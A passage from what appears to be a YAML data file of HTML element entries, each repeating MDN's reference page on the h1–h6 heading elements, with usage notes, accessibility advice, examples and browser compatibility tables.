License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements)"
- name: h4
  summary: The <h1> to <h6> HTML elements represent six levels of section headings
  description: "# \\<h1\\>–\\<h6\\>: The HTML Section Heading elements\n\nThe `<h1>` to `<h6>` [HTML](../index) elements represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest. By default, all heading elements create a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) box in the layout, starting on a new line and taking up the full width available in their containing block.\n\n## Try it\n\n#### HTML Demo: \\<h1-h6\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Beetles</h1>\n    <h2>External morphology</h2>\n    <h3>Head</h3>\n    <h4>Mouthparts</h4>\n    <h3>Thorax</h3>\n    <h4>Prothorax</h4>\n    <h4>Pterothorax</h4>\n\n    h1,\n    h2,\n    h3,\n    h4 {\n      margin: 0.1rem 0;\n    }\n\n    h1 {\n      font-size: 2rem;\n    }\n\n    h2 {\n      font-size: 1.5rem;\n      padding-left: 20px;\n    }\n\n    h3 {\n      font-size: 1.2rem;\n      padding-left: 40px;\n    }\n\n    h4 {\n      font-size: 1rem;\n      font-style: italic;\n      padding-left: 60px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThese elements only include the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Heading information can be used by user agents to construct a table of contents for a document automatically.\n- Do not use heading elements to resize text. Instead, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property.\n- Do not skip heading levels: always start from `<h1>`, followed by `<h2>` and so on.\n\n### Avoid using multiple `<h1>` elements on one page\n\nWhile using multiple `<h1>` elements on one page is allowed by the HTML standard (as long as they are not [nested](#nesting)), this is not considered a best practice. A page should generally have a single `<h1>` element that describes the content of the page (similar to the document's [`<title>`](title) element).\n\n**Note:** Nesting multiple `<h1>` elements in nested [sectioning elements](../element#content_sectioning) was allowed in older versions of the HTML standard. However, this was never considered a best practice and is now non-conforming. Read more in [There Is No Document Outline Algorithm](https://adrianroselli.com/2016/08/there-is-no-document-outline-algorithm.html).\n\nPrefer using only one `<h1>` per page and [nest headings](#nesting) without skipping levels.\n\n## Accessibility\n\n### Navigation\n\nA common navigation technique for users of screen reading software is to quickly jump from heading to heading in order to determine the content of the page. Because of this, it is important to not skip one or more heading levels. Doing so may create confusion, as the person navigating this way may be left wondering where the missing heading is.\n\n**Don't do this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n```\n\n#### Nesting\n\nHeadings may be nested as subsections to reflect the organization of the content of the page. Most screen readers can also generate an ordered list of all the headings on a page, which can help a person quickly determine the hierarchy of the content:\n\n1.  `h1` Beetles\n    1.  `h2` Etymology\n    2.  `h2` Distribution and Diversity\n    3.  `h2` Evolution\n        1.  `h3` Late Paleozoic\n        2.  `h3` Jurassic\n        3.  `h3` Cretaceous\n        4.  `h3` Cenozoic\n    4.  `h2` External Morphology\n        1.  `h3` Head\n            1.  `h4` Mouthparts\n        2.  `h3` Thorax\n            1.  `h4` Prothorax\n            2.  `h4` Pterothorax\n        3.  `h3` Legs\n        4.  `h3` Wings\n        5.  `h3` Abdomen\n\nWhen headings are nested, heading levels may be \"skipped\" when closing a subsection.\n\n- [Headings • Page Structure • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/headings/)\n- [MDN Understanding WCAG, Guideline 1.3 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.3_%E2%80%94_create_content_that_can_be_presented_in_different_ways)\n- [Understanding Success Criterion 1.3.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n- [Understanding Success Criterion 2.4.6 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-descriptive.html)\n- [Understanding Success Criterion 2.4.10 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-headings.html)\n\n### Labeling section content\n\nAnother common navigation technique for users of screen reading software is to generate a list of [sectioning content](../element#content_sectioning) and use it to determine the page's layout.\n\nSectioning content can be labeled using a combination of the [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) and [`id`](../global_attributes#id) attributes, with the label concisely describing the purpose of the section. This technique is useful for situations where there is more than one sectioning element on the same page.\n\n#### Sectioning content examples\n\nhtml\n\n```\n<header>\n  <nav aria-labelledby=\"primary-navigation\">\n    <h2 id=\"primary-navigation\">Primary navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</header>\n\n<!-- page content -->\n\n<footer>\n  <nav aria-labelledby=\"footer-navigation\">\n    <h2 id=\"footer-navigation\">Footer navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</footer>\n```\n\nIn this example, screen reading technology would announce that there are two [`<nav>`](nav) sections, one called \"Primary navigation\" and one called \"Footer navigation\". If labels were not provided, the person using screen reading software may have to investigate each `nav` element's contents to determine their purpose.\n\n- [Using the aria-labelledby attribute](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby)\n- [Labeling Regions • Page Structure • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/labels/#using-aria-labelledby)\n\n## Examples\n\n### All headings\n\nThe following code shows all the heading levels, in use.\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n<h5>Heading level 5</h5>\n<h6>Heading level 6</h6>\n```\n\n### Example page\n\nThe following code shows a few headings with some content under them.\n\nhtml\n\n```\n<h1>Heading elements</h1>\n<h2>Summary</h2>\n<p>Some text here…</p>\n\n<h2>Examples</h2>\n<h3>Example 1</h3>\n<p>Some text here…</p>\n\n<h3>Example 2</h3>\n<p>Some text here…</p>\n\n<h2>See also</h2>\n<p>Some text here…</p>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                                                          |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                    |\n| Implicit ARIA role                          | [heading](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/heading_role)                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLHeadingElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLHeadingElement)                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n### html.elements.h1\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h2\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h3\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h4\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h5\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h6\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<p>`](p)\n- [`<div>`](div)\n- [`<section>`](section)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements)"
- name: h5
  summary: The <h1> to <h6> HTML elements represent six levels of section headings
  description: "# \\<h1\\>–\\<h6\\>: The HTML Section Heading elements\n\nThe `<h1>` to `<h6>` [HTML](../index) elements represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest. By default, all heading elements create a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) box in the layout, starting on a new line and taking up the full width available in their containing block.\n\n## Try it\n\n#### HTML Demo: \\<h1-h6\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Beetles</h1>\n    <h2>External morphology</h2>\n    <h3>Head</h3>\n    <h4>Mouthparts</h4>\n    <h3>Thorax</h3>\n    <h4>Prothorax</h4>\n    <h4>Pterothorax</h4>\n\n    h1,\n    h2,\n    h3,\n    h4 {\n      margin: 0.1rem 0;\n    }\n\n    h1 {\n      font-size: 2rem;\n    }\n\n    h2 {\n      font-size: 1.5rem;\n      padding-left: 20px;\n    }\n\n    h3 {\n      font-size: 1.2rem;\n      padding-left: 40px;\n    }\n\n    h4 {\n      font-size: 1rem;\n      font-style: italic;\n      padding-left: 60px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThese elements only include the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Heading information can be used by user agents to construct a table of contents for a document automatically.\n- Do not use heading elements to resize text. Instead, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property.\n- Do not skip heading levels: always start from `<h1>`, followed by `<h2>` and so on.\n\n### Avoid using multiple `<h1>` elements on one page\n\nWhile using multiple `<h1>` elements on one page is allowed by the HTML standard (as long as they are not [nested](#nesting)), this is not considered a best practice. A page should generally have a single `<h1>` element that describes the content of the page (similar to the document's [`<title>`](title) element).\n\n**Note:** Nesting multiple `<h1>` elements in nested [sectioning elements](../element#content_sectioning) was allowed in older versions of the HTML standard. However, this was never considered a best practice and is now non-conforming. Read more in [There Is No Document Outline Algorithm](https://adrianroselli.com/2016/08/there-is-no-document-outline-algorithm.html).\n\nPrefer using only one `<h1>` per page and [nest headings](#nesting) without skipping levels.\n\n## Accessibility\n\n### Navigation\n\nA common navigation technique for users of screen reading software is to quickly jump from heading to heading in order to determine the content of the page. Because of this, it is important to not skip one or more heading levels. Doing so may create confusion, as the person navigating this way may be left wondering where the missing heading is.\n\n**Don't do this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n```\n\n#### Nesting\n\nHeadings may be nested as subsections to reflect the organization of the content of the page. Most screen readers can also generate an ordered list of all the headings on a page, which can help a person quickly determine the hierarchy of the content:\n\n1.  `h1` Beetles\n    1.  `h2` Etymology\n    2.  `h2` Distribution and Diversity\n    3.  `h2` Evolution\n        1.  `h3` Late Paleozoic\n        2.  `h3` Jurassic\n        3.  `h3` Cretaceous\n        4.  `h3` Cenozoic\n    4.  `h2` External Morphology\n        1.  `h3` Head\n            1.  `h4` Mouthparts\n        2.  `h3` Thorax\n            1.  `h4` Prothorax\n            2.  `h4` Pterothorax\n        3.  `h3` Legs\n        4.  `h3` Wings\n        5.  `h3` Abdomen\n\nWhen headings are nested, heading levels may be \"skipped\" when closing a subsection.\n\n- [Headings • Page Structure • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/headings/)\n- [MDN Understanding WCAG, Guideline 1.3 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.3_%E2%80%94_create_content_that_can_be_presented_in_different_ways)\n- [Understanding Success Criterion 1.3.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n- [Understanding Success Criterion 2.4.6 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-descriptive.html)\n- [Understanding Success Criterion 2.4.10 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-headings.html)\n\n### Labeling section content\n\nAnother common navigation technique for users of screen reading software is to generate a list of [sectioning content](../element#content_sectioning) and use it to determine the page's layout.\n\nSectioning content can be labeled using a combination of the [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) and [`id`](../global_attributes#id) attributes, with the label concisely describing the purpose of the section. This technique is useful for situations where there is more than one sectioning element on the same page.\n\n#### Sectioning content examples\n\nhtml\n\n```\n<header>\n  <nav aria-labelledby=\"primary-navigation\">\n    <h2 id=\"primary-navigation\">Primary navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</header>\n\n<!-- page content -->\n\n<footer>\n  <nav aria-labelledby=\"footer-navigation\">\n    <h2 id=\"footer-navigation\">Footer navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</footer>\n```\n\nIn this example, screen reading technology would announce that there are two [`<nav>`](nav) sections, one called \"Primary navigation\" and one called \"Footer navigation\". If labels were not provided, the person using screen reading software may have to investigate each `nav` element's contents to determine their purpose.\n\n- [Using the aria-labelledby attribute](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby)\n- [Labeling Regions • Page Structure • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/labels/#using-aria-labelledby)\n\n## Examples\n\n### All headings\n\nThe following code shows all the heading levels, in use.\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n<h5>Heading level 5</h5>\n<h6>Heading level 6</h6>\n```\n\n### Example page\n\nThe following code shows a few headings with some content under them.\n\nhtml\n\n```\n<h1>Heading elements</h1>\n<h2>Summary</h2>\n<p>Some text here…</p>\n\n<h2>Examples</h2>\n<h3>Example 1</h3>\n<p>Some text here…</p>\n\n<h3>Example 2</h3>\n<p>Some text here…</p>\n\n<h2>See also</h2>\n<p>Some text here…</p>\n```\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), heading content, palpable content.                                                                                                                                                                                                          |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content).                                                                                                                                                                                                                    |\n| Implicit ARIA role                          | [heading](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/heading_role)                                                                                                                                                                                                   |\n| Permitted ARIA roles                        | [`tab`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/tab_role), [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) or [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) |\n| DOM interface                               | [`HTMLHeadingElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLHeadingElement)                                                                                                                                                                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n|                    | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                    | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `Heading_Elements` | 1       | 12   | 1       | 15    | 1      | 18             | 4                   | 14            | 1             | 1.0              | 4.4             |     |\n\n### html.elements.h1\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h2\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h3\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h4\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h5\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n### html.elements.h6\n\nBCD tables only load in the browser with JavaScript enabled. Enable JavaScript to view data.\n\n## See also\n\n- [`<p>`](p)\n- [`<div>`](div)\n- [`<section>`](section)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/Heading_Elements)"
- name: h6
  summary: The <h1> to <h6> HTML elements represent six levels of section headings
  description: "# \\<h1\\>–\\<h6\\>: The HTML Section Heading elements\n\nThe `<h1>` to `<h6>` [HTML](../index) elements represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest. By default, all heading elements create a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) box in the layout, starting on a new line and taking up the full width available in their containing block.\n\n## Try it\n\n#### HTML Demo: \\<h1-h6\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Beetles</h1>\n    <h2>External morphology</h2>\n    <h3>Head</h3>\n    <h4>Mouthparts</h4>\n    <h3>Thorax</h3>\n    <h4>Prothorax</h4>\n    <h4>Pterothorax</h4>\n\n    h1,\n    h2,\n    h3,\n    h4 {\n      margin: 0.1rem 0;\n    }\n\n    h1 {\n      font-size: 2rem;\n    }\n\n    h2 {\n      font-size: 1.5rem;\n      padding-left: 20px;\n    }\n\n    h3 {\n      font-size: 1.2rem;\n      padding-left: 40px;\n    }\n\n    h4 {\n      font-size: 1rem;\n      font-style: italic;\n      padding-left: 60px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThese elements only include the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Heading information can be used by user agents to construct a table of contents for a document automatically.\n- Do not use heading elements to resize text. Instead, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property.\n- Do not skip heading levels: always start from `<h1>`, followed by `<h2>` and so on.\n\n### Avoid using multiple `<h1>` elements on one page\n\nWhile using multiple `<h1>` elements on one page is allowed by the HTML standard (as long as they are not [nested](#nesting)), this is not considered a best practice. A page should generally have a single `<h1>` element that describes the content of the page (similar to the document's [`<title>`](title) element).\n\n**Note:** Nesting multiple `<h1>` elements in nested [sectioning elements](../element#content_sectioning) was allowed in older versions of the HTML standard. However, this was never considered a best practice and is now non-conforming. Read more in [There Is No Document Outline Algorithm](https://adrianroselli.com/2016/08/there-is-no-document-outline-algorithm.html).\n\nPrefer using only one `<h1>` per page and [nest headings](#nesting) without skipping levels.\n\n## Accessibility\n\n### Navigation\n\nA common navigation technique for users of screen reading software is to quickly jump from heading to heading in order to determine the content of the page. Because of this, it is important to not skip one or more heading levels. Doing so may create confusion, as the person navigating this way may be left wondering where the missing heading is.\n\n**Don't do this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n```\n\n#### Nesting\n\nHeadings may be nested as subsections to reflect the organization of the content of the page. Most screen readers can also generate an ordered list of all the headings on a page, which can help a person quickly determine the hierarchy of the content:\n\n1.  `h1` Beetles\n    1.  `h2` Etymology\n    2.  `h2` Distribution and Diversity\n    3.  `h2` Evolution\n        1.  `h3` Late Paleozoic\n        2.  `h3` Jurassic\n        3.  `h3` Cretaceous\n        4.  `h3` Cenozoic\n    4.  `h2` External Morphology\n        1.  `h3` Head\n            1.  `h4` Mouthparts\n        2.  `h3` Thorax\n            1.  `h4` Prothorax\n            2.  `h4` Pterothorax\n        3.  `h3` Legs\n        4.  `h3` Wings\n        5.  `h3` Abdomen\n\nWhen headings are nested, heading levels may be \"skipped\" when closing a subsection.\n\n- [Headings • Page Structure • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/headings/)\n- [MDN Understanding WCAG, Guideline 1.3 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.3_%E2%80%94_create_content_that_can_be_presented_in_different_ways)\n- [Understanding Success Criterion 1.3.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n- [Understanding Success Criterion 2.4.6 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-descriptive.html)\n- [Understanding Success Criterion 2.4.10 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-headings.html)\n\n### Labeling section content\n\nAnother common navigation technique for users of screen reading software is to generate a list of [sectioning content](../element#content_sectioning) and use it to determine the page's layout.\n\nSectioning content can be labeled using a combination of the [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) and [`id`](../global_attributes#id) attributes, with the label concisely describing the purpose of the section. This technique is useful for situations where there is more than one sectioning element on the same page.\n\n#### Sectioning content examples\n\nhtml\n\n```\n<header>\n  <nav aria-labelledby=\"primary-navigation\">\n    <h2 id=\"primary-navigation\">Primary navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</header>\n\n<!-- page content -->\n\n<footer>\n  <nav aria-labelledby=\"footer-navigation\">\n    <h2 id=\"footer-navigation\">Footer navigation</h2>\n    <!-- navigation items -->\n  </nav>\n</footer>\n```\n\nIn this example, screen reading technology would announce that there are two [`<nav>`](nav) sections, one called \"Primary navigation\" and one called \"Footer navigation\". If labels were not provided, the person using screen reading software may have to investigate each `nav` element's contents to determine their purpose.\n\n- [Using the aria-labelledby attribute](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby)\n- [Labeling Regions • Page Structure • W3C WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/labels/#using-aria-labelledby)\n\n## Examples\n\n### All 